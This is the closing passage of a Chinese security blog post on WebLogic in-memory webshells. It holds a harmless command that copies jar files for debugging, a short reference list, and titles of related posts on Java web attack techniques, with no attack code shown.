</span></span><span class="line"><span class="cl">find modules/ -name <span class="s2">&#34;*.jar&#34;</span> <span class="p">|</span>xargs -n1 -I <span class="o">{}</span> cp <span class="o">{}</span> ./jar/<span class="p">;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
</ol>
<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
<ol>
<li><a href="https://www.cnblogs.com/nice0e3/p/14956677.html" target="_blank" rel="noopener">Java安全之Weblogic内存马</a></li>
<li><a href="https://mp.weixin.qq.com/s/tgQO9ILHudfkkOzeahICTg" target="_blank" rel="noopener">红蓝必备 你需要了解的weblogic攻击手法</a></li>
<li><a href="https://www.cnblogs.com/bitterz/p/14970230.html" target="_blank" rel="noopener">Weblogic下的servlet内存马注入-无参照纯调试</a></li>
</ol>

            </div>

            
    
    
        <ul class="post-copyright">
            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
            
                
                
                
                
                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">https://myzxcg.com/2021/11/Weblogic-内存马分析与实现/</a></li>
            
            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
            
        </ul>
    



        </article>

        

        


        


        


        
    
    
        <div class="related-posts">
            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
            <ul class="related-list">
                
                    <li class="related-item">
                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E4%B8%8E%E5%88%A9%E7%94%A8/" class="related-link">FastJson 反序列化绕过与利用</a>
                    </li>
                
            </ul>
        </div>
    



        


        
    <footer class="minimal-footer">
        
            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
        
        
        
            
        
    </footer>



        


        
    
        
        
    
    
    
    
        <ul class="post-nav">
            
                <li class="post-nav-prev">
                    <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="prev">&lt; Spring 内存马实现</a>
                </li>
            
            
                <li class="post-nav-next">
                    <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="next">Shiro 回显与内存马实现 &gt;</a>
                </li>
            
        </ul>
    



        
    

        
            <div class="load-comments">
                <div id="load-comments">加载评论</div>
            </div>
        

        

        

        
            <div id="utterances"></div>
        

        
    



    </div>
</main>


            
    <div id="back-to-top" class="back-to-top">
        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
    </div>


            
    <footer id="footer" class="footer">
        <div class="footer-inner">
            

            
    
        <ul class="socials"><li class="socials-item">
                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
                </li><li class="socials-item">
                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
                </li><li class="socials-item">
                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
                </li></ul>
    


            <div class="site-info">©&nbsp;2022&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
              </div>

            
        </div>
    </footer>


        </div>
        

        






    

        

        

        
            <script>
    function loadComments() {
        (function() {
            var utterances = document.getElementById("utterances");
            var script = document.createElement('script');
            script.src = 'https://utteranc.es/client.js';
            script.async = true;
            script.crossOrigin = 'anonymous';
            script.setAttribute('repo', 'myzxcg\/myzxcg.github.io');
            script.setAttribute('issue-term', 'title');
            const isDark = getCurrentTheme() === 'dark';
        if (isDark) {
            script.setAttribute('theme', 'photon-dark');
        } else {
            script.setAttribute('theme', 'github-light');
        }
            
            utterances.appendChild(script);
        })();
    }
</script>
        

        

    



    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>

<script>
    let imgNodes = document.querySelectorAll('div.post-body img');
    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");

    mediumZoom(imgNodes, {
        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
    })
</script>




    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>







    </body>
</html>
